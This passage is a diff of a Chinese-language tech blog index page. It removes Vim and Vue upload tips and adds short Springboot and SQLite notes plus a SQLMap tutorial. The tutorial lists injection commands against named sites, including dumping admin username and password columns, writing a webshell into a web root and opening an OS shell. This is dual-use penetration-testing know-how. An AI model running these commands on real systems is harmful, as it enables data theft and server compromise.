@@ -184,156 +184,57 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/25/2026-09-25-expanded-blog-vim/">
-                [expanded] [blog] VIM
+            <a href="/2026/10/10/springboot/">
+                Springboot
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-09-25</span>
+                <span class="date">2026-10-10</span>
             
             
+            
+                <span class="category">
+                    <a href="/categories/后端/">后端</a>
+                </span>
             
         </div>
     </div>
 
     
         <div class="content">
-            <h1 id="expanded-blog-VIM"><a href="#expanded-blog-VIM" class="headerlink" title="[expanded] [blog] VIM"></a>[expanded] [blog] VIM</h1><blockquote>
-<p>原始问题: [blog] VIM</p>
-</blockquote>
-<h1 id="Vim-编辑器技能点清单"><a href="#Vim-编辑器技能点清单" class="headerlink" title="Vim 编辑器技能点清单"></a>Vim 编辑器技能点清单</h1><blockquote>
-<p>场景占位: 编辑 <CONFIG_FILE>, 修改 <LOG_PATH>, 搜索 <ERROR_PATTERN><br>阅读顺序: 扫标题 → 记住反直觉 3-5 条即可动手</p>
-</blockquote>
-<hr>
-<h2 id="1-打开文件默认进命令模式-不能直接打字"><a href="#1-打开文件默认进命令模式-不能直接打字" class="headerlink" title="1. 打开文件默认进命令模式,不能直接打字"></a>1. 打开文件默认进命令模式,不能直接打字</h2><ul>
-<li><strong>规则</strong>: 打开文件后先按 <code>i</code> 进编辑模式,编辑完按 <code>Esc</code> 回命令模式</li>
-<li><strong>为什么</strong>: Vim 设计哲学是”阅读时间 &gt; 编辑时间”,命令模式让光标移动和批量操作更高效</li>
-<li><strong>踩坑</strong>: 新手打开文件直接敲字符,结果触发了删除&#x2F;跳转等命令,文件被改得面目全非</li>
-<li><strong>例外</strong>: <code>vim -c startinsert &lt;FILE&gt;</code> 可直接进编辑模式,但失去了 Vim 核心优势</li>
-</ul>
-<h2 id="2-dd-是剪切不是删除-误删内容还在剪贴板"><a href="#2-dd-是剪切不是删除-误删内容还在剪贴板" class="headerlink" title="2. dd 是剪切不是删除,误删内容还在剪贴板"></a>2. <code>dd</code> 是剪切不是删除,误删内容还在剪贴板</h2><ul>
-<li><strong>规则</strong>: <code>dd</code> 删除行后用 <code>p</code> 可粘贴回来,真删除用 <code>&quot;_dd</code> (黑洞寄存器)</li>
-<li><strong>为什么</strong>: Vim 所有删除操作都会进剪贴板,方便移动文本,但会覆盖之前复制的内容</li>
-<li><strong>踩坑</strong>: 复制了 A 行,删除 B 行后想粘贴 A,结果粘贴出 B</li>
-</ul>
-<h2 id="3-末行模式替换默认只替换每行第一个匹配"><a href="#3-末行模式替换默认只替换每行第一个匹配" class="headerlink" title="3. 末行模式替换默认只替换每行第一个匹配"></a>3. 末行模式替换默认只替换每行第一个匹配</h2><ul>
-<li><strong>规则</strong>: 全局替换必须用 <code>:%s/&lt;OLD&gt;/&lt;NEW&gt;/g</code>,缺 <code>%</code> 只改当前行,缺 <code>g</code> 只改每行首个</li>
-<li><strong>为什么</strong>: Vim 继承 sed 语法,默认保守操作避免误改</li>
-<li><strong>踩坑</strong>: <code>:s/http/https/</code> 只改了当前行第一个 http,其他 999 行未动</li>
-</ul>
-<h2 id="4-撤销后再编辑会丢失被撤销的分支"><a href="#4-撤销后再编辑会丢失被撤销的分支" class="headerlink" title="4. 撤销后再编辑会丢失被撤销的分支"></a>4. 撤销后再编辑会丢失被撤销的分支</h2><ul>
-<li><strong>规则</strong>: 撤销 (<code>u</code>) 后想恢复用 <code>Ctrl+r</code>,但撤销后编辑新内容会永久丢失被撤销的历史</li>
-<li><strong>为什么</strong>: Vim 默认是线性 undo 树,不保留分支 (除非开启 undofile)</li>
-<li><strong>踩坑</strong>: 撤销 5 步,改了一个字,想回到撤销前的状态,发现那 5 步永远找不回了</li>
-<li><strong>例外</strong>: <code>:earlier 4m</code> 可基于时间回溯,但需要 undofile 持久化</li>
-</ul>
-<h2 id="5-分屏后-q-只关当前窗口不退出-Vim"><a href="#5-分屏后-q-只关当前窗口不退出-Vim" class="headerlink" title="5. 分屏后 :q 只关当前窗口不退出 Vim"></a>5. 分屏后 <code>:q</code> 只关当前窗口不退出 Vim</h2><ul>
-<li><strong>规则</strong>: 分屏环境用 <code>:qa</code> 退出所有窗口,<code>:q</code> 只关当前分屏</li>
-<li><strong>为什么</strong>: Vim 把每个分屏视为独立窗口,<code>:q</code> 是 quit window 不是 quit vim</li>
-<li><strong>踩坑</strong>: 开了 3 个分屏,按 <code>:q</code> 以为退出了,结果 Vim 还在后台占着文件锁</li>
-</ul>
-<h2 id="6-搜索后高亮不会自动消失"><a href="#6-搜索后高亮不会自动消失" class="headerlink" title="6. 搜索后高亮不会自动消失"></a>6. 搜索后高亮不会自动消失</h2><ul>
-<li><strong>规则</strong>: <code>/</code> 搜索后用 <code>:noh</code> 取消高亮,或 <code>:set nohlsearch</code> 永久关闭</li>
-<li><strong>为什么</strong>: Vim 认为高亮是有用的视觉提示,不会因为光标移动而清除</li>
-<li><strong>踩坑</strong>: 搜索 <code>error</code> 后满屏黄色高亮,看其他内容时干扰视线</li>
-</ul>
-<h2 id="7-D-删除到行尾但不删除换行符"><a href="#7-D-删除到行尾但不删除换行符" class="headerlink" title="7. D 删除到行尾但不删除换行符"></a>7. <code>D</code> 删除到行尾但不删除换行符</h2><ul>
-<li><strong>规则</strong>: <code>D</code> 等价于 <code>d$</code>,删除光标到行尾内容但保留空行,<code>dd</code> 才删整行含换行符</li>
-<li><strong>为什么</strong>: Vim 区分”行内容”和”行本身”,<code>D</code> 是行内操作,<code>dd</code> 是行操作</li>
-<li><strong>踩坑</strong>: 用 <code>D</code> 想删除整行,结果留下一堆空行</li>
-</ul>
-<h2 id="8-w-另存为不会切换当前编辑文件"><a href="#8-w-另存为不会切换当前编辑文件" class="headerlink" title="8. :w &lt;PATH&gt; 另存为不会切换当前编辑文件"></a>8. <code>:w &lt;PATH&gt;</code> 另存为不会切换当前编辑文件</h2><ul>
-<li><strong>规则</strong>: <code>:w &lt;NEW_FILE&gt;</code> 后当前缓冲区仍是原文件,要切换需 <code>:e &lt;NEW_FILE&gt;</code></li>
-<li><strong>为什么</strong>: Vim 的 <code>:w</code> 只是写入操作,不改变缓冲区绑定</li>
-<li><strong>踩坑</strong>: 另存为 <BACKUP_FILE> 后继续编辑,以为在改备份,实际还在改原文件</li>
-</ul>
-<h2 id="9-多文件编辑时-bn-bp-切换的是缓冲区不是标签页"><a href="#9-多文件编辑时-bn-bp-切换的是缓冲区不是标签页" class="headerlink" title="9. 多文件编辑时 :bn/:bp 切换的是缓冲区不是标签页"></a>9. 多文件编辑时 <code>:bn/:bp</code> 切换的是缓冲区不是标签页</h2><ul>
-<li><strong>规则</strong>: <code>vim &lt;FILE1&gt; &lt;FILE2&gt;</code> 打开的是缓冲区列表,<code>:bn/:bp</code> 切换,<code>:ls</code> 查看列表</li>
-<li><strong>为什么</strong>: Vim 的 buffer&#x2F;window&#x2F;tab 是三层概念,多文件默认进 buffer 不是 tab</li>
-<li><strong>踩坑</strong>: 以为 <code>:bn</code> 会像浏览器切标签,结果当前窗口内容直接被替换</li>
-</ul>
-<h2 id="10-yy-复制整行包括换行符"><a href="#10-yy-复制整行包括换行符" class="headerlink" title="10. yy 复制整行包括换行符"></a>10. <code>yy</code> 复制整行包括换行符</h2><ul>
-<li><strong>规则</strong>: <code>yy</code> 复制后 <code>p</code> 粘贴会插入新行,想粘贴到行内用 <code>^y$</code> 只复制内容不含换行</li>
-<li><strong>为什么</strong>: Vim 的行操作 (yy&#x2F;dd&#x2F;p) 都是面向”完整行”的,包括不可见的换行符</li>
-<li><strong>踩坑</strong>: 复制配置行想拼接成一行,<code>p</code> 后发现自动换行了</li>
-</ul>
-<h2 id="11-分屏尺寸调整只对当前窗口生效"><a href="#11-分屏尺寸调整只对当前窗口生效" class="headerlink" title="11. 分屏尺寸调整只对当前窗口生效"></a>11. 分屏尺寸调整只对当前窗口生效</h2><ul>
-<li><strong>规则</strong>: <code>Ctrl+w +/-</code> 调整当前窗口高度,其他窗口会自动压缩,<code>Ctrl+w =</code> 平均分配</li>
-<li><strong>为什么</strong>: Vim 终端空间有限,调整一个窗口必然挤压其他窗口</li>
-<li><strong>踩坑</strong>: 调大上方窗口后,下方窗口只剩 1 行看不清内容</li>
-</ul>
-<h2 id="12-set-nu-只在当前会话生效"><a href="#12-set-nu-只在当前会话生效" class="headerlink" title="12. :set nu 只在当前会话生效"></a>12. <code>:set nu</code> 只在当前会话生效</h2><ul>
-<li><strong>规则</strong>: 临时设置用 <code>:set nu</code>,永久生效需写入 <code>~/.vimrc</code></li>
-<li><strong>为什么</strong>: Vim 启动时只读取配置文件,运行时的 <code>:set</code> 命令不会持久化</li>
-<li><strong>踩坑</strong>: 每次打开文件都要手动 <code>:set nu</code>,以为 Vim 记不住设置</li>
-</ul>
-<h2 id="13-r-替换单字符后自动回命令模式-R-进入持续替换模式"><a href="#13-r-替换单字符后自动回命令模式-R-进入持续替换模式" class="headerlink" title="13. r 替换单字符后自动回命令模式,R 进入持续替换模式"></a>13. <code>r</code> 替换单字符后自动回命令模式,<code>R</code> 进入持续替换模式</h2><ul>
-<li><strong>规则</strong>: 改一个字符用 <code>r&lt;NEW_CHAR&gt;</code>,改多个字符用 <code>R</code> 进替换模式后按 <code>Esc</code> 退出</li>
-<li><strong>为什么</strong>: <code>r</code> 是原子操作,<code>R</code> 是模式切换,设计上避免误操作</li>
-<li><strong>踩坑</strong>: 想连续替换多个字符,按 <code>r</code> 后只改了一个就停了</li>
-</ul>
-<h2 id="14-分屏移动光标和移动分屏是不同的快捷键"><a href="#14-分屏移动光标和移动分屏是不同的快捷键" class="headerlink" title="14. 分屏移动光标和移动分屏是不同的快捷键"></a>14. 分屏移动光标和移动分屏是不同的快捷键</h2><ul>
-<li><strong>规则</strong>: <code>Ctrl+w hjkl</code> 移动光标到其他分屏,<code>Ctrl+w HJKL</code> (大写) 移动分屏本身</li>
-<li><strong>为什么</strong>: Vim 区分”我去哪个窗口”和”把窗口移到哪”,大小写区分操作对象</li>
-<li><strong>踩坑</strong>: 想把右侧分屏移到左侧,按 <code>Ctrl+w h</code> 结果只是光标跳过去了</li>
-</ul>
-<h2 id="15-执行外部命令会暂停-Vim"><a href="#15-执行外部命令会暂停-Vim" class="headerlink" title="15. :!&lt;COMMAND&gt; 执行外部命令会暂停 Vim"></a>15. <code>:!&lt;COMMAND&gt;</code> 执行外部命令会暂停 Vim</h2><ul>
-<li><strong>规则</strong>: <code>:!ls</code> 执行后需按回车返回 Vim,想在 Vim 内看输出用 <code>:r !&lt;COMMAND&gt;</code></li>
-<li><strong>为什么</strong>: Vim 把控制权交给 shell,执行完等待用户确认再返回</li>
-<li><strong>踩坑</strong>: 执行 <code>:!&lt;LONG_SCRIPT&gt;</code> 后黑屏,以为 Vim 卡死了,其实在等按键</li>
-</ul>
-<hr>
-<h2 id="🔥-5-秒必记-5-条"><a href="#🔥-5-秒必记-5-条" class="headerlink" title="🔥 5 秒必记 5 条"></a>🔥 5 秒必记 5 条</h2><ol>
-<li><strong>打开文件按 <code>i</code> 才能打字,<code>Esc</code> 回命令模式</strong></li>
-<li><strong>全局替换必须 <code>:%s/&lt;OLD&gt;/&lt;NEW&gt;/g</code>,缺 <code>%</code> 或 <code>g</code> 都不是全局</strong></li>
-<li><strong><code>dd</code> 是剪切不是删除,误删用 <code>p</code> 粘贴回来</strong></li>
-<li><strong>撤销后编辑新内容会丢失被撤销的分支</strong></li>
-<li><strong>分屏环境 <code>:q</code> 只关当前窗口,<code>:qa</code> 才退出 Vim</strong></li>
-</ol>
-<hr>
-<h2 id="决策速查-遇到-X-想-Y"><a href="#决策速查-遇到-X-想-Y" class="headerlink" title="决策速查(遇到 X 想 Y)"></a>决策速查(遇到 X 想 Y)</h2><table>
-<thead>
-<tr>
-<th>遇到</th>
-<th>想</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>打开文件不能打字</td>
-<td>按 <code>i</code> 进编辑模式</td>
-</tr>
-<tr>
-<td>替换只改了一处</td>
-<td>检查是否缺 <code>%</code> (全文) 或 <code>g</code> (全行)</td>
-</tr>
-<tr>
-<td>删除后想恢复</td>
-<td><code>dd</code> 删除的用 <code>p</code> 粘贴,真删除用 <code>&quot;_dd</code></td>
-</tr>
-<tr>
-<td>搜索后满屏高亮</td>
-<td><code>:noh</code> 取消高亮</td>
-</tr>
-<tr>
-<td>分屏按 <code>:q</code> 没退出</td>
-<td>用 <code>:qa</code> 退出所有窗口</td>
-</tr>
-<tr>
-<td>另存为后还在改原文件</td>
-<td><code>:w &lt;NEW&gt;</code> 后需 <code>:e &lt;NEW&gt;</code> 切换缓冲区</td>
-</tr>
-<tr>
-<td>复制行粘贴后自动换行</td>
-<td><code>yy</code> 含换行符,用 <code>^y$</code> 只复制内容</td>
-</tr>
-<tr>
-<td>调整分屏后其他窗口变形</td>
-<td><code>Ctrl+w =</code> 平均分配所有窗口</td>
-</tr>
-</tbody></table>
-<hr>
-<p><em>by claude-sonnet-5 nightly expand · 2026-09-25</em></p>
+            <p>文章</p>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h2 id="微服务-dubbo-zookeeper"><a href="#微服务-dubbo-zookeeper" class="headerlink" title="微服务 dubbo - zookeeper"></a>微服务 dubbo - zookeeper</h2><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><h3 id="undertow-对比-tomcat"><a href="#undertow-对比-tomcat" class="headerlink" title="undertow 对比 tomcat"></a>undertow 对比 tomcat</h3>
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/10/10/sqlite/">
+                SQLite
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-10-10</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/数据库/">数据库</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进数据库</span></span><br><span class="line">sqlite3 /Users/mac/tabby.db</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看有哪些表</span></span><br><span class="line">.tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 user 表内容</span></span><br><span class="line">SELECT * FROM user;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line">.quit</span><br></pre></td></tr></table></figure>
 
         </div>
     
@@ -345,152 +246,673 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/25/2026-09-25-expanded-blog-vue2-%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0component-%E5%81%9A%E6%88%90%E7%BB%84%E4%BB%B6/">
-                [expanded] [blog] vue2 大文件上传component(做成组件)
+            <a href="/2026/10/10/sqlmap/">
+                SQLMap
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-09-25</span>
+                <span class="date">2026-10-10</span>
             
             
+            
+                <span class="category">
+                    <a href="/categories/渗透工具/">渗透工具</a>
+                </span>
             
         </div>
     </div>
 
     
         <div class="content">
-            <h1 id="expanded-blog-vue2-大文件上传component-做成组件"><a href="#expanded-blog-vue2-大文件上传component-做成组件" class="headerlink" title="[expanded] [blog] vue2 大文件上传component(做成组件)"></a>[expanded] [blog] vue2 大文件上传component(做成组件)</h1><blockquote>
-<p>原始问题: [blog] vue2 大文件上传component(做成组件)</p>
-</blockquote>
-<h1 id="前端大文件分片上传组件技能点清单-Vue2"><a href="#前端大文件分片上传组件技能点清单-Vue2" class="headerlink" title="前端大文件分片上传组件技能点清单(Vue2)"></a>前端大文件分片上传组件技能点清单(Vue2)</h1><blockquote>
-<p>场景占位: 上传至 <SLICE_SERVER_ENDPOINT>, 文件标识用 <FILE_MD5>, 分片索引用 <CHUNK_INDEX><br>阅读顺序: 扫标题 → 记住反直觉 3-5 条即可动手</p>
-</blockquote>
-<hr>
-<h2 id="1-先算文件-MD5-再切片-阻塞式串行处理多文件"><a href="#1-先算文件-MD5-再切片-阻塞式串行处理多文件" class="headerlink" title="1. 先算文件 MD5 再切片,阻塞式串行处理多文件"></a>1. 先算文件 MD5 再切片,阻塞式串行处理多文件</h2><ul>
-<li><strong>规则</strong>: 每个文件必须先完整计算 MD5(秒传判断依据)再切片,多文件用 for 循环串行处理而非 Promise.all</li>
-<li><strong>为什么</strong>: 并行计算多个大文件 MD5 会撑爆浏览器内存(FileReader 同时读取多个 GB 文件),串行虽慢但稳定;MD5 必须先算完才能判断服务端是否已存在(秒传)</li>
-<li><strong>踩坑</strong>: 用 <code>files.map(async)</code> 并行处理 5 个 2GB 文件直接卡死标签页</li>
-<li><strong>例外</strong>: 文件小于 100MB 且数量少于 3 个时可并行</li>
+            <p>文章</p>
+<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="分类文章"><a href="#分类文章" class="headerlink" title="分类文章"></a>分类文章</h3><h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	http://www.vuln.cn/1992<br />
+</h3>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap简介
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap支持五种不同的注入模式：
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		4、联合查询注入，可以使用union的情况下的注入。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		5、堆查询注入，可以同时执行多条语句的执行时的注入。
+	</li>
 </ul>
-<h2 id="2-分片上传进度用”已上传分片数-总分片数”-不用字节累加"><a href="#2-分片上传进度用”已上传分片数-总分片数”-不用字节累加" class="headerlink" title="2. 分片上传进度用”已上传分片数&#x2F;总分片数”,不用字节累加"></a>2. 分片上传进度用”已上传分片数&#x2F;总分片数”,不用字节累加</h2><ul>
-<li><strong>规则</strong>: 进度条绑定 <code>upchunk / blockNum</code> 而非 <code>uploaded / file.size</code>,每个分片成功回调后 upchunk++</li>
-<li><strong>为什么</strong>: 字节累加需要监听每个分片的 xhr.upload.onprogress,在断点续传场景下已上传分片的进度无法复现,分片计数更可靠且实现简单</li>
-<li><strong>踩坑</strong>: 断点续传后进度条从 0 开始重新跑,用户以为上传失败重新开始</li>
-<li><strong>例外</strong>: 需要精确到字节的实时速率显示时必须用 onprogress</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap支持的数据库有
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	检测注入
+</h2>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	基本格式
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1"
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	默认使用level1检测全部数据库类型
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	跟随302跳转
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br />
+当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br />
+目的就是：要追踪到错误信息。
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	cookie注入
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	当程序有防get注入的时候，可以使用cookie注入<br />
+sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	从post数据包中注入
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	可以使用burpsuite或者temperdata等工具来抓取post包
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql &nbsp; &nbsp;指定username参数
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	注入成功后
+</h2>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	获取数据库基本信息
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 --dbs
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询有哪些数据库
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test --tables
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询test数据库中有哪些表
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin --columns
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询test数据库中admin表有哪些字段
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin -C "username,password" --dump
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	dump出字段username与password中的数据
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	其他命令参考下面
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	从数据库中搜索字段
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password<br />
+在dedecms数据库中搜索字段admin或者password。
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	读取与写入文件
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	首先找需要网站的物理路径，其次需要有可写或可读权限。
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br />
+--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br />
+--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br />
+#示例：<br />
+sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	使用shell命令：
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell<br />
+接下来指定网站可写目录：<br />
+“E:\php\htdocs\dvwa”
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap详细命令：
+</h2>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--is-dba 当前用户权限（是否为root权限）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbs 所有数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-db 网站当前数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--users 所有数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-user 当前数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--random-agent 构造随机user-agent
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--passwords 数据库密码
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+	</li>
 </ul>
-<h2 id="3-文件唯一标识用”上传密钥-文件元信息”的-MD5-不直接用文件内容-MD5"><a href="#3-文件唯一标识用”上传密钥-文件元信息”的-MD5-不直接用文件内容-MD5" class="headerlink" title="3. 文件唯一标识用”上传密钥+文件元信息”的 MD5,不直接用文件内容 MD5"></a>3. 文件唯一标识用”上传密钥+文件元信息”的 MD5,不直接用文件内容 MD5</h2><ul>
-<li><strong>规则</strong>: <code>uniqueFileName = md5(uploadkey + name + type + lastModifiedDate + size)</code>,与文件内容 MD5(fileMd5)分开</li>
